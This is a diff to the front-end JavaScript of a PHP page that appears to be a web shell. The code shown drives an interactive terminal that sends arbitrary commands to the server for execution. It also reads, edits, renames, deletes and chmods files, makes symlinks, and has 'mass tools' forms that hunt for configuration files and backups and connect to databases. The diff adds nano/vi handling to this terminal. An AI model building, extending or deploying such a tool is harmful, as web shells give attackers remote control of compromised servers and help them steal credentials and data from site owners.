+                const path = button.getAttribute('data-path');
+                const name = button.getAttribute('data-name');
+                const modal = event.currentTarget;
+                modal.querySelector('#viewFileName').textContent = name;
+                const contentArea = modal.querySelector('#viewFileContent');
+                contentArea.textContent = 'Loading file content...';
 
-                    form.addEventListener('submit', function(e) {
-                        e.preventDefault();
-                        const resultArea = document.getElementById(resultId);
-                        const submitButton = form.querySelector('button[type="submit"]');
-                        const originalButtonText = submitButton.innerHTML;
-
-                        resultArea.style.display = 'block';
-                        resultArea.textContent = 'Processing...';
-                        submitButton.disabled = true;
-                        submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';
-
-                        const formData = new FormData(form);
-
-                        fetch(window.location.href, {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                if (data.success) {
-                                    resultArea.textContent = data.output || 'Completed successfully, but no output was returned.';
-                                } else {
-                                    resultArea.textContent = 'Error: ' + (data.output || 'Unknown error.');
-                                }
-                            })
-                            .catch(error => {
-                                resultArea.textContent = 'Request failed: ' + error;
-                            })
-                            .finally(() => {
-                                submitButton.disabled = false;
-                                submitButton.innerHTML = originalButtonText;
-                            });
+                fetch('?filesrc=' + encodeURIComponent(path))
+                    .then(response => {
+                        if (!response.ok) throw new Error('File not found or not readable.');
+                        return response.text();
+                    })
+                    .then(data => {
+                        contentArea.textContent = data;
+                    })
+                    .catch(err => {
+                        contentArea.textContent = 'Error: ' + err.message;
+                        showToast('Failed to fetch file content.', 'error');
                     });
-                }
-
-                handleMassToolForms('findConfigsForm', 'findConfigsResult');
-                handleMassToolForms('findBackupsForm', 'findBackupsResult');
-                handleMassToolForms('dbConnectForm', 'dbConnectResult');
-
-                handleModalEvents('serverInfoModal', (event) => {
-                    const contentArea = event.currentTarget.querySelector('#serverInfoContent');
-                    contentArea.innerHTML = '<div class="text-center"><span class="spinner-border"></span><p>Loading...</p></div>';
-                    fetch('?action=serverInfo')
-                        .then(response => response.text())
-                        .then(data => {
-                            contentArea.innerHTML = data;
-                        })
-                        .catch(err => {
-                            contentArea.innerHTML = '<p class="text-danger">Failed to load server info.</p>';
-                        });
-                });
             });
-        </script>
+
+            // Define the function to open edit file modal, so it can be reused
+            function openEditFileModal(path, name) {
+                const modal = document.getElementById('editFileModal');
+                if (!modal) return; // Safety check
+
+                modal.querySelector('#editFileName').textContent = name;
+                modal.querySelector('#editFilePath').value = path;
+                const editor = modal.querySelector('#fileEditor');
+                editor.value = 'Loading file content...';
+
+                fetch('?filesrc=' + encodeURIComponent(path))
+                    .then(response => {
+                        if (!response.ok) throw new Error('File not found or not readable.');
+                        return response.text();
+                    })
+                    .then(data => {
+                        editor.value = data;
+                    })
+                    .catch(err => {
+                        editor.value = 'Error: ' + err.message + '. You can create this file by saving.';
+                        showToast('Failed to fetch file content. You can create it by saving.', 'error');
+                    });
+
+                // Show the modal using Bootstrap's JS API
+                const bsModal = new bootstrap.Modal(modal);
+                bsModal.show();
+            }
+
+            // Update the original event listener to call this function
+            handleModalEvents('editFileModal', (event) => {
+                const button = event.relatedTarget;
+                const path = button.getAttribute('data-path');
+                const name = button.getAttribute('data-name');
+                openEditFileModal(path, name);
+            });
+
+            handleModalEvents('renameModal', (event) => {
+                const button = event.relatedTarget;
+                const modal = event.currentTarget;
+                modal.querySelector('#renamePath').value = button.getAttribute('data-path');
+                modal.querySelector('#newName').value = button.getAttribute('data-name');
+            });
+
+            handleModalEvents('permsModal', (event) => {
+                const button = event.relatedTarget;
+                const modal = event.currentTarget;
+                modal.querySelector('#permsPath').value = button.getAttribute('data-path');
+                modal.querySelector('#perms').value = button.getAttribute('data-perms');
+            });
+
+            handleModalEvents('deleteModal', (event) => {
+                const button = event.relatedTarget;
+                const modal = event.currentTarget;
+                modal.querySelector('#deletePath').value = button.getAttribute('data-path');
+                modal.querySelector('#deleteType').value = button.getAttribute('data-type');
+                modal.querySelector('#deleteItemName').textContent = button.getAttribute('data-name');
+            });
+
+            handleModalEvents('symlinkModal', (event) => {
+                const modal = event.currentTarget;
+                modal.querySelector('input[name="target"]').value = '';
+                modal.querySelector('input[name="linkName"]').value = '';
+            });
+
+            // --- Terminal Interaktif ---
+            const commandForm = document.getElementById('commandForm');
+            let terminalCwd = '<?php echo htmlspecialchars($path); ?>'; // Set initial CWD
+
+            function updateTerminalPrompt() {
+                const maxPathLength = 20; // Max length for the displayed path
+                let displayPath = terminalCwd;
+                if (displayPath.length > maxPathLength) {
+                    displayPath = '.../' + displayPath.split('/').slice(-2).join('/');
+                }
+                const prompt = `<?php echo htmlspecialchars(get_current_user()); ?>@<span class="text-warning">${displayPath}</span>:~$ `;
+                document.querySelector('.terminal-prompt').innerHTML = prompt;
+            }
+
+            if (commandForm) {
+                updateTerminalPrompt(); // Initial prompt setup
+
+                commandForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const commandInput = this.querySelector('input[name="command"]');
+                    const command = commandInput.value.trim();
+                    if (command === '') return;
+
+                    const terminalOutput = document.getElementById('terminal-output');
+                    const promptText = document.querySelector('.terminal-prompt').innerHTML;
+
+                    terminalOutput.innerHTML += `<div><span class="text-secondary">${promptText}</span> ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
+                    commandInput.value = '';
+
+                    // --- LOGIKA BARU UNTUK PERINTAH 'clear' ---
+                    if (command === 'clear') {
+                        terminalOutput.innerHTML = ''; // Kosongkan seluruh isi terminal
+                        // Tambahkan kembali prompt dan perintah 'clear' yang baru saja diketik
+                        terminalOutput.innerHTML += `<div><span class="text-secondary">${promptText}</span> ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
+                        terminalOutput.scrollTop = terminalOutput.scrollHeight; // Gulir ke bawah
+                        return; // Hentikan pemrosesan lebih lanjut, jangan kirim ke server
+                    }
+                    // --- AKHIR LOGIKA BARU ---
+
+                    // --- LOGIKA BARU UNTUK PERINTAH 'nano' dan 'vi' ---
+                    const editCommandMatch = command.match(/^(nano|vi)\s+([^\s]+)$/);
+                    if (editCommandMatch) {
+                        const editorCommand = editCommandMatch[1];
+                        const fileName = editCommandMatch[2];
+                        const filePath = terminalCwd + '/' + fileName;
+                        openEditFileModal(filePath, fileName);
+                        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        return; // Hentikan pemrosesan lebih lanjut, jangan kirim ke server
+                    }
+                    // --- AKHIR LOGIKA BARU UNTUK PERINTAH 'nano' dan 'vi' ---
+
+                    const formData = new FormData();
+                    formData.append('action', 'executeCommand');
+                    formData.append('command', command);
+                    formData.append('cwd', terminalCwd); // Send current terminal CWD
+
+                    fetch(window.location.href, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                const output = data.output.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                                terminalOutput.innerHTML += `<div>${output.replace(/\n/g, '<br>')}</div>`;
+                                terminalCwd = data.new_path; // Update CWD from server response
+                                updateTerminalPrompt(); // Update the prompt with the new path
+                            } else {
+                                terminalOutput.innerHTML += `<div class="text-danger">Error: ${data.output}</div>`;
+                            }
+                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        }).catch(error => {
+                            terminalOutput.innerHTML += `<div class="text-danger">Request failed: ${error}</div>`;
+                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        });
+                });
+
+                const commandModal = document.getElementById('commandModal');
+                commandModal.addEventListener('shown.bs.modal', () => {
+                    commandModal.querySelector('input[name="command"]').focus();
+                });
+            }
+
+            // --- Mass Tools AJAX Forms ---
+            function handleMassToolForms(formId, resultId) {
+                const form = document.getElementById(formId);
+                if (!form) return;
+
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const resultArea = document.getElementById(resultId);
+                    const submitButton = form.querySelector('button[type="submit"]');
+                    const originalButtonText = submitButton.innerHTML;
+
+                    resultArea.style.display = 'block';
+                    resultArea.textContent = 'Processing...';
+                    submitButton.disabled = true;
+                    submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';
+
+                    const formData = new FormData(form);
+
+                    fetch(window.location.href, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                resultArea.textContent = data.output || 'Completed successfully, but no output was returned.';
+                            } else {
+                                resultArea.textContent = 'Error: ' + (data.output || 'Unknown error.');
+                            }
+                        })
+                        .catch(error => {
+                            resultArea.textContent = 'Request failed: ' + error;
+                        })
+                        .finally(() => {
+                            submitButton.disabled = false;
+                            submitButton.innerHTML = originalButtonText;
+                        });
+                });
+            }
+
+            handleMassToolForms('findConfigsForm', 'findConfigsResult');
+            handleMassToolForms('findBackupsForm', 'findBackupsResult');
+            handleMassToolForms('dbConnectForm', 'dbConnectResult');
+
+            handleModalEvents('serverInfoModal', (event) => {
+                const contentArea = event.currentTarget.querySelector('#serverInfoContent');
+                contentArea.innerHTML = '<div class="text-center"><span class="spinner-border"></span><p>Loading...</p></div>';
+                fetch('?action=serverInfo')
+                    .then(response => response.text())
+                    .then(data => {
+                        contentArea.innerHTML = data;
+                    })
+                    .catch(err => {
+                        contentArea.innerHTML = '<p class="text-danger">Failed to load server info.</p>';
+                    });
+            });
+        });
+    </script>
 </body>
+
 </html>
